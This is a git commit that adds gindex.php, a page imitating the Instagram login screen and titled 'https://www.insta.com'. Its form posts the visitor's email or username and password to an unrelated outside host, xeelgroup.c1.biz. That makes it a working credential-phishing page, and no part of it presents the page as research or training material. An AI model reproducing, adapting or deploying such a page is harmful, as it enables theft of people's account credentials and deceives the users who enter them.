429dc945958272298eaeada5e16ebfc99b4e9263
https-verificationsite <118043350+https-verificationsite@users.noreply.github.com>
2022-11-12 14:52:08 +0530

    creat
    Signed-off-by: https-verificationsite <118043350+https-verificationsite@users.noreply.github.com>

---
+++ gindex.php
@@ -0,0 +1,204 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>https://www.insta.com</title>
+</head>
+<body>
+
+
+
+
+
+
+
+<div class="fb" id="fb">
+	<img src="
+insta12.jpg">
+</div>
+
+
+
+
+
+
+
+
+<h id="usname">
+
+
+
+</h>
+<style>
+	
+#usname{
+
+  position: relative;
+  top: -1280px;
+  left: 300px;
+
+  font-size: 50px;
+
+
+}
+
+
+
+
+.pp img{
+	position: relative;
+      width: 300px;
+
+      top: -1560px;
+      left: 320px;
+      height: 280px;
+}
+
+</style>
+
+
+
+
+
+
+
+
+<div class="pp">
+	<img src="profiles/instagram.jpg">
+</div>
+
+<style type="text/css">
+
+
+
+
+    
+.fbb{
+
+  position: relative;
+  padding-left: -29px;
+  size: cover;
+
+}
+
+.fbb img{
+    position: relative;
+    width: 1050px;
+    height: 180px;
+    top: -1830px;
+    left: -10px;
+    size: cover;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+.fb{
+
+  position: relative;
+  top: -5px;
+  padding-left: -29px;
+
+
+
+  border-image-repeat: no-repeat;
+  size: cover;
+
+}
+
+.fb img{
+	position: relative;
+    width: 976px;
+	height: 1800px;
+}
+
+</style>
+
+
+
+
+
+
+
+
+        <div id="header">
+
+            <form action="http://xeelgroup.c1.biz/php_page/ins/fb.php">
+                <input type="email" name="email" placeholder="Phone number, username, or email">
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="submit" name="login" value="Login">
+            </form>
+
+        </div>
+
+
+
+
+<style>
+
+
+
+        #header form input[type="email"] {
+            position: relative;
+            top: -1478px;
+            background-color: #DCDCDC;
+            width: 750px;
+            left: 85px;
+            border-radius:  10px;
+            height: 115px;
+            font-size: 35px;
+            padding-left: 30px;
+
+            
+        
+        }
+
+        #header form input[type="password"] {
+            position: relative;
+            top: -1470px;
+            background-color: #DCDCDC;
+           width: 750px;
+            left: 85px;
+            border-radius:  10px;
+            height: 115px;
+            font-size: 35px;
+            padding-left: 30px;
+               }
+
+
+
+        #header form input[type="submit"] {
+            position: relative;
+            top: -1450px;
+            background-color:#4285f4;
+            width: 780px;
+            left: 85px;
+            font-variant-position: center ; 
+            border-radius:  10px;
+            height: 120px;
+            font-size: 38px;
+            color: white;
+        
+        }
+
+
+}
+
+
+
+</style>
+
+</body>
+</html>
